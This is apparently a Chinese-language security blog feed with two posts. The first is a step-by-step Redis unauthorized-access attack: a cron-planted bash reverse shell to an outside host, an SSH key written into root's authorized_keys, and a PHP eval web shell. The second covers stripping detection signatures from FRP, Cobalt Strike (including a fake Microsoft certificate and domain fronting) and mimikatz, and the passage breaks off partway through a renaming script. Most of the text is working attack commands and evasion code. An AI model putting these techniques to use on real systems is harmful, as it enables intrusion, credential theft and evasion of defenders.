    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><h2 id="通过计划任务获取SHELL"><a href="#通过计划任务获取SHELL" class="headerlink" title="通过计划任务获取SHELL"></a>通过计划任务获取SHELL</h2><p>首先进行连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.251.17 -p 6379</span><br></pre></td></tr></table></figure><p>然后设置文件夹路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs</span><br></pre></td></tr></table></figure><p>如果出现<code>(error) ERR Changing directory: Permission denied</code>标明Redis并不是root权限启动的，权限不足，需要使用<code>redis-server /etc/redis/redis.conf</code>来启动程序，不能使用<code>service redis start</code>来启动</p><p>接着修改文件，Ubuntu的计划任务是在这个文件中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config set dbfilename root</span><br></pre></td></tr></table></figure><p>设置计划任务，需要添加<code>\n</code>符号，因为写进去后会有很多无用数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set -.- &quot;\n\n\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.251.16&#x2F;8899 0&gt;&amp;1\n\n\n&quot;</span><br></pre></td></tr></table></figure><p>保存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">save</span><br></pre></td></tr></table></figure><h2 id="通过SSH-key获取SHELL"><a href="#通过SSH-key获取SHELL" class="headerlink" title="通过SSH key获取SHELL"></a>通过SSH key获取SHELL</h2><p>首先生成公钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p>然后把key写入文本中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e &quot;\n\n\n\n&quot;; cat test.pub; echo -e &quot;\n\n\n\n&quot;) &gt; test.txt</span><br></pre></td></tr></table></figure><p>接着使用命令启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat test.txt | redis-cli -h 192.168.251.18 -p 6379 -x set crack</span><br><span class="line">redis-cli -h 192.168.251.18 -p 6379</span><br><span class="line">config set dir &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><h2 id="通过Web目录写SHELL"><a href="#通过Web目录写SHELL" class="headerlink" title="通过Web目录写SHELL"></a>通过Web目录写SHELL</h2><p>需要条件</p><ul><li>知道web目录</li><li>当前用户在该目录下具有写权限</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;ascotbe.com&#x2F;html&#x2F;</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set 1 &quot;&lt;?php @eval($_POST[&#39;123&#39;]);?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>常见工具特征去除</title>
    <link href="https://www.ascotbe.com/2021/07/09/FrequentToolCharacteristics/"/>
    <id>https://www.ascotbe.com/2021/07/09/FrequentToolCharacteristics/</id>
    <published>2021-07-09T15:07:46.000Z</published>
    <updated>2021-07-09T08:42:44.662Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/FrequentToolCharacteristics/1.png" alt="image-20210709162951851" style="zoom:50%;" /><h2 id="FRP改造"><a href="#FRP改造" class="headerlink" title="FRP改造"></a>FRP改造</h2><blockquote><h3 id="改造之前"><a href="#改造之前" class="headerlink" title="改造之前"></a>改造之前</h3></blockquote><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/FrequentToolCharacteristics/2.png" alt="image-20210707150953360"></p><p>在受害者机器上使用<code>frpc.exe -c frpc_socker.ini</code>连接服务起的时候，会产生一个这种数据校检</p><blockquote><h3 id="流量改造"><a href="#流量改造" class="headerlink" title="流量改造"></a>流量改造</h3></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkg\msg\msg.go</span><br></pre></td></tr></table></figure><p>这几个函数中保存着上面的信息</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/FrequentToolCharacteristics/3.png" alt="image-20210707151346655"></p><p>我在前加个了前缀</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/FrequentToolCharacteristics/4.png" alt="image-20210708142818186"></p><p>而在<code>pkg\util\version\version.go</code> 中定义了版本信息，这里也可以修改一下</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/FrequentToolCharacteristics/5.png" alt="image-20210707153734705"></p><p>改成随便一个版本</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/FrequentToolCharacteristics/6.png" alt="image-20210708142835960"></p><p>结果如下</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/FrequentToolCharacteristics/7.png" alt="image-20210708145449323"></p><blockquote><h3 id="编译方式"><a href="#编译方式" class="headerlink" title="编译方式"></a>编译方式</h3></blockquote><p>首先执行<code>make</code>会进行一些GitHub的包下载（最好使用代理</p><p>接着执行<code>make -f Makefile.cross-compiles</code>进行编译</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/FrequentToolCharacteristics/8.png" alt="image-20210708143346779"></p><blockquote><h3 id="配置文件改造"><a href="#配置文件改造" class="headerlink" title="配置文件改造"></a>配置文件改造</h3></blockquote><p>全称只需要修改这个文件<code>cmd/frpc/sub/root.go</code></p><p>先修改var位置，添加ip、port、fileContent这三个参数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> (</span><br><span class="line">cfgFile     <span class="keyword">string</span></span><br><span class="line">showVersion <span class="keyword">bool</span></span><br><span class="line"></span><br><span class="line">serverAddr        <span class="keyword">string</span></span><br><span class="line">user              <span class="keyword">string</span></span><br><span class="line">protocol          <span class="keyword">string</span></span><br><span class="line">token             <span class="keyword">string</span></span><br><span class="line">logLevel          <span class="keyword">string</span></span><br><span class="line">logFile           <span class="keyword">string</span></span><br><span class="line">logMaxDays        <span class="keyword">int</span></span><br><span class="line">disableLogColor   <span class="keyword">bool</span></span><br><span class="line">ip                <span class="keyword">string</span></span><br><span class="line">port              <span class="keyword">string</span></span><br><span class="line">fileContent       <span class="keyword">string</span></span><br><span class="line">proxyName         <span class="keyword">string</span></span><br><span class="line">localIp           <span class="keyword">string</span></span><br><span class="line">localPort         <span class="keyword">int</span></span><br><span class="line">remotePort        <span class="keyword">int</span></span><br><span class="line">useEncryption     <span class="keyword">bool</span></span><br><span class="line">useCompression    <span class="keyword">bool</span></span><br><span class="line">customDomains     <span class="keyword">string</span></span><br><span class="line">subDomain         <span class="keyword">string</span></span><br><span class="line">httpUser          <span class="keyword">string</span></span><br><span class="line">httpPwd           <span class="keyword">string</span></span><br><span class="line">locations         <span class="keyword">string</span></span><br><span class="line">hostHeaderRewrite <span class="keyword">string</span></span><br><span class="line">role              <span class="keyword">string</span></span><br><span class="line">sk                <span class="keyword">string</span></span><br><span class="line">multiplexer       <span class="keyword">string</span></span><br><span class="line">serverName        <span class="keyword">string</span></span><br><span class="line">bindAddr          <span class="keyword">string</span></span><br><span class="line">bindPort          <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line">kcpDoneCh <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>再修改传参位置</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">rootCmd.PersistentFlags().StringVarP(&amp;cfgFile, <span class="string">&quot;config&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;./frpc.ini&quot;</span>, <span class="string">&quot;config file of frpc&quot;</span>)</span><br><span class="line">rootCmd.PersistentFlags().BoolVarP(&amp;showVersion, <span class="string">&quot;version&quot;</span>, <span class="string">&quot;v&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;version of frpc&quot;</span>)</span><br><span class="line">rootCmd.PersistentFlags().StringVarP(&amp;ip, <span class="string">&quot;server_addr&quot;</span>, <span class="string">&quot;t&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;server_addr&quot;</span>)</span><br><span class="line">rootCmd.PersistentFlags().StringVarP(&amp;port, <span class="string">&quot;server_port&quot;</span>, <span class="string">&quot;p&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;server_port&quot;</span>)</span><br><span class="line">kcpDoneCh = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后自定义一个函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getFileContent</span><span class="params">(ip <span class="keyword">string</span>, port <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> content <span class="keyword">string</span> = <span class="string">`[common]</span></span><br><span class="line"><span class="string">    server_addr = `</span> + ip + <span class="string">`</span></span><br><span class="line"><span class="string">    server_port = `</span> + port + <span class="string">`</span></span><br><span class="line"><span class="string">    tls_enable = true</span></span><br><span class="line"><span class="string">token = china_nb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[plugin_socks5]</span></span><br><span class="line"><span class="string">type = tcp</span></span><br><span class="line"><span class="string">remote_port = 12345</span></span><br><span class="line"><span class="string">plugin = socks5</span></span><br><span class="line"><span class="string">plugin_user = admin</span></span><br><span class="line"><span class="string">plugin_passwd = admin</span></span><br><span class="line"><span class="string">use_encryption = true </span></span><br><span class="line"><span class="string">use_compression = true</span></span><br><span class="line"><span class="string">    `</span></span><br><span class="line">fileContent = content</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改<code>runClient</code>函数    </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">runClient</span><span class="params">(cfgFilePath <span class="keyword">string</span>,ip <span class="keyword">string</span>,port <span class="keyword">string</span>)</span> <span class="params">(err error)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> content <span class="keyword">string</span></span><br><span class="line">getFileContent(ip,port)</span><br><span class="line"><span class="comment">//scontent, err = config.GetRenderedConfFromFile(cfgFilePath)</span></span><br><span class="line">content, err = fileContent, <span class="literal">nil</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cfg, err := parseClientCommonCfg(CfgFileTypeIni, content)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pxyCfgs, visitorCfgs, err := config.LoadAllConfFromIni(cfg.User, content, cfg.Start)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = startService(cfg, pxyCfgs, visitorCfgs, cfgFilePath)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后runClient()函数下调用我们自定义的函数getFileContent()</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> rootCmd = &amp;cobra.Command&#123;</span><br><span class="line">Use:   <span class="string">&quot;frpc&quot;</span>,</span><br><span class="line">Short: <span class="string">&quot;frpc is the client of frp (https://github.com/fatedier/frp)&quot;</span>,</span><br><span class="line">RunE: <span class="function"><span class="keyword">func</span><span class="params">(cmd *cobra.Command, args []<span class="keyword">string</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> showVersion &#123;</span><br><span class="line">fmt.Println(version.Full())</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Do not show command usage here.</span></span><br><span class="line">err := runClient(cfgFile,ip,port)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line">os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功结果</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/FrequentToolCharacteristics/9.png" alt="image-20210708165905688"></p><h2 id="CobaltStrike改造"><a href="#CobaltStrike改造" class="headerlink" title="CobaltStrike改造"></a>CobaltStrike改造</h2><blockquote><h3 id="修改默认端口"><a href="#修改默认端口" class="headerlink" title="修改默认端口"></a>修改默认端口</h3></blockquote><p>编辑teamserver文件，更改<code>Dcobaltstrike.server_port</code>参数为8090</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/FrequentToolCharacteristics/10.png" alt="image-20210709100449609"></p><blockquote><h3 id="修改证书特征"><a href="#修改证书特征" class="headerlink" title="修改证书特征"></a>修改证书特征</h3></blockquote><p>查看证书，密码默认的123456</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -list -v -keystore cobaltstrike.store</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/FrequentToolCharacteristics/11.png" alt="image-20210709100749504"></p><p>从图中可以看到别名、所有者、发布者都有明显的cobaltstrike特征，所以我们可以把原证书给删了，使用以下命令生成一个新的证书</p><ul><li><code>-alias</code>          指定别名</li><li><code>-storepass</code>      指定更改密钥库的存储口令</li><li><code>‐keypass pass</code>   指定更改条目的密钥口令</li><li><code>-keyalg</code>         指定算法</li><li><code>-dname</code>          指定所有者信息 </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -keystore cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias Microsoft.com -dname &quot;CN&#x3D;Microsoft e-Szigno Root CA, OU&#x3D;e-Szigno CA, O&#x3D;Microsoft Ltd., L&#x3D;Budapest, S&#x3D;HU, C&#x3D;HU&quot; </span><br></pre></td></tr></table></figure><blockquote><h3 id="流量伪装"><a href="#流量伪装" class="headerlink" title="流量伪装"></a>流量伪装</h3></blockquote><p>通过使用项目来操作<a href="https://github.com/rsmudge/Malleable-C2-Profiles">Malleable-C2-Profiles</a></p><p>使用方法：<code>./teamserver [external IP] [password] [/path/to/my.profile]</code></p><p>如果我们自己编写插件的话，可以使用<code>.\c2lint [/path/to/my.profile]</code>来验证是否可以使用</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/FrequentToolCharacteristics/12.png" alt="image-20210709133929402"></p><p>可以看到我们使用了插件后流量数据修改了，但是还有一个不足的点这边会显示我们的IP地址</p><blockquote><h3 id="域前置"><a href="#域前置" class="headerlink" title="域前置"></a>域前置</h3></blockquote><p>在上述我们修改了流量特征后发现还是会泄露我们的IP，会给防守队的溯源提供便利，所以我们可以使用CDN进行操作。由于现在的CDN需要验证域名所属了，没办法用像<code>ccc.github.com</code>、<code>ccc.apple.com</code>这种的域名了，所以本文中使用<code>a.test.com</code>作为域名讲解</p><p>首先修改我们使用的Malleable-C2-Profiles，把下图的参数都修改为<code>a.test.com</code>这个域名</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/FrequentToolCharacteristics/13.png" alt="image-20210709142040450"></p><p>然后重启Cobaltstrike，在监听器中按下图进行设置</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/FrequentToolCharacteristics/14.png" alt="image-20210709150735281"></p><p>然后再用该监听器生成的木马即可实现域前置</p><h2 id="mimikatz改造"><a href="#mimikatz改造" class="headerlink" title="mimikatz改造"></a>mimikatz改造</h2><p>替换关键字脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">git <span class="built_in">clone</span> --depth=1 https://github.com.cnpmjs.org/gentilkiwi/mimikatz.git mimikatz</span><br><span class="line"></span><br><span class="line"><span class="comment">## BASIC Strings ##</span></span><br><span class="line"></span><br><span class="line">mimi=$(cat /dev/urandom | tr -dc <span class="string">&quot;a-zA-Z&quot;</span> | fold -w 8 | head -n 1)</span><br><span class="line">mv windows/mimikatz windows/<span class="variable">$mimi</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/mimikatz/<span class="variable">$mimi</span>/g&quot;</span></span><br><span class="line">MIMI=$(cat /dev/urandom | tr -dc <span class="string">&quot;A-Z&quot;</span> | fold -w 8 | head -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/MIMIKATZ/<span class="variable">$MIMI</span>/g&quot;</span></span><br><span class="line">Mimi=$(cat /dev/urandom | tr -dc <span class="string">&quot;a-zA-Z&quot;</span> | fold -w 8 | head -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/Mimikatz/<span class="variable">$Mimi</span>/g&quot;</span></span><br><span class="line">string=$(cat /dev/urandom | tr -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | fold -w 5 | head -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/DELPY/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(cat /dev/urandom | tr -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | fold -w 8 | head -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/Benjamin/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(cat /dev/urandom | tr -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | fold -w 23 | head -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/benjamin@gentilkiwi.com/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(cat /dev/urandom | tr -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | fold -w 15 | head -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/creativecommons/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(cat /dev/urandom | tr -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | fold -w 10 | head -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/gentilkiwi/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(cat /dev/urandom | tr -dc <span class="string">&quot;a-zA-Z&quot;</span> | fold -w 4 | head -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/KIWI/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(cat /dev/urandom | tr -dc <span class="string">&quot;a-zA-Z&quot;</span> | fold -w 4 | head -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/Kiwi/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">kiwi=$(cat /dev/urandom | tr -dc <span class="string">&quot;a-zA-Z&quot;</span> | fold -w 4 | head -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/kiwi/<span class="variable">$kiwi</span>/g&quot;</span></span><br><span class="line">string=$(cat /dev/urandom | tr -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | fold -w 13 | head -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/A La Vie, A L/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(cat /dev/urandom | tr -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | fold -w 24 | head -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/vincent.letoux@gmail.com/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(cat /dev/urandom | tr -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | fold -w 8 | head -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/benjamin/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(cat /dev/urandom | tr -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | fold -w 14 | head -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/Benjamin DELPY/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(cat /dev/urandom | tr -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | fold -w 5 | head -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/oe.eo/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(cat /dev/urandom | tr -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | fold -w 14 | head -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/pingcastle.com/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(cat /dev/urandom | tr -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | fold -w 16 | head -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/mysmartlogon.com/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(cat /dev/urandom | tr -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | fold -w 15 | head -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/Vincent LE TOUX/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Basic Function Names ##</span></span><br><span class="line"></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/logonPasswords/loGoNpASSwoRdS/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/dpapi/dPApi/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/sekurlsa/seKuRlSa/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/sekurLSA/seKuRlSa/g&quot;</span></span><br><span class="line">find windows/ 